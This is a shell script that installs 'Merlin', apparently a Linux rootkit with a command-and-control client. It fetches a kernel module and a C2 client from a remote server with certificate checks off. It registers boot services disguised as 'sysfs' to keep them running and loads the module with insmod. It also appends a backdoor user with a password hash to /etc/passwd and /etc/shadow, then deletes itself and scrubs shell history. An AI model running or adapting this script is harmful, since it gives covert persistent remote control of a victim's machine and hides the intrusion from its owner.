#!/bin/sh


mkdir /media/merlin_


################################ MERLIN INSTALLATION SCRIPT ################################

#################################### MERLIN DOWNLOAD #######################################
    echo "Choose install mode :"
    echo "1) Local mode NO C2 !!!"
    echo "2) Local C2"
    echo "3) FULL Distant C2"
    read -p "Enter your choice number : " choice

    # Définir le mode en fonction du choix
    case $choice in 
        1)
            mode=1
            echo "Selected : FULL Local  NO C2 !!!"
            ;;       
        2)
            mode=2
            echo "Selected : Local C2"
            ;;
        3)
            mode=3
            echo "Selected : FULL Distant C2"
            ;;
        *)
            echo "Invalid Choice"
            return 1
            ;;
    esac


    if [ $mode -eq 1 ]; then
        # Local share mode
        echo "LOCAL SHARE Download starting"
        cp /mnt/shared_folder/modules/merlin/merlin_.ko /media/merlin_/merlin_.ko
        cp /mnt/shared_folder/c2/merlin_client.py /media/merlin_/merlin_client.py
        cp /mnt/shared_folder/c2/merlin_server.crt /media/merlin_/merlin_server.crt

    elif [ $mode -eq 2 ]; then
        # Local C2 mode
        wget --no-check-certificate https://10.0.2.2:4443/modules/merlin/merlin_.ko -O /media/merlin_/merlin_.ko
        wget --no-check-certificate https://10.0.2.2:4443/c2/merlin_client.py -O /media/merlin_/merlin_client.py
        wget --no-check-certificate https://10.0.2.2:4443/c2/merlin_server.crt -O /media/merlin_/merlin_server.crt


    elif [ $mode -eq 3 ]; then
        # FULL DISTANT C2 mode
        echo "Distant Web Server Download starting"
        wget --no-check-certificate https://YOUR_SERVER/phoenix2006/merlin_.ko -O /media/merlin_/merlin_.ko    
        wget --no-check-certificate https://YOUR_SERVER/merlin_client_distant.py -O /media/merlin_/merlin_client.py
        wget --no-check-certificate https://YOUR_SERVER/merlin_server.crt -O /media/merlin_/merlin_server.crt

    else
        echo "Invalid Choice"
        return 1
    fi  

################################ MERLIN C2 ################################
if [ $mode -eq 2 ] || [ $mode -eq 3 ]; then
    # Merlin C2 requirements install:
    sudo apk add python3
    sudo apk add openssl-dev

    chmod +x /media/merlin_/merlin_client.py

cat <<EOF | sudo tee /etc/init.d/merlin_c2
#!/sbin/openrc-run

name="sysfs2"

start() {
    ebegin "Loading sysfs2"
    start-stop-daemon --start --exec /usr/bin/python3 -- /media/merlin_/merlin_client.py &
    eend $?   
}
EOF
    chmod +x /etc/init.d/merlin_c2
    rc-update add "merlin_c2" default
    /etc/init.d/merlin_c2 start
    fi

################################ MERLIN PERSISTENCE ################################
cat <<EOF | sudo tee /etc/init.d/merlin_module
#!/sbin/openrc-run

name="sysfs"

start() {
    ebegin "Loading sysfs"
    start-stop-daemon --start --exec /sbin/insmod -- /media/merlin_/merlin_.ko
    eend $?
}
EOF

chmod +x /etc/init.d/merlin_module
rc-update add "merlin_module" default
/etc/init.d/merlin_module start

################################ MERLIN STANDARD USER ADD ################################
# username: merlin      
# password: merlin

cat <<'EOF' | sudo tee -a /etc/passwd
merlin_:x:1000:1000:Linux User,,,:/home/merlin_:/bin/sh
EOF

cat <<'EOF' | sudo tee -a /etc/shadow
merlin_:$6$SI7ZTBmv6S90x29M$NMkzxGlD0SmBQFXcFpk/H6EH14QzA5qdvIztHNAuAWgdsXgk1als9F8jwpANqXBRhkiBF.uZ7e7F7Xb.MaJON1:20067:0:99999:7:::
EOF

################################ MERLIN CLEANUP ################################
rm -rf /root/merlin_install.sh

history_file="$HOME/.ash_history"

word_to_remove="merlin|wget|install"

grep -v "$word_to_remove" "$history_file" > "$history_file.temp" && mv "$history_file.temp" "$history_file"

clear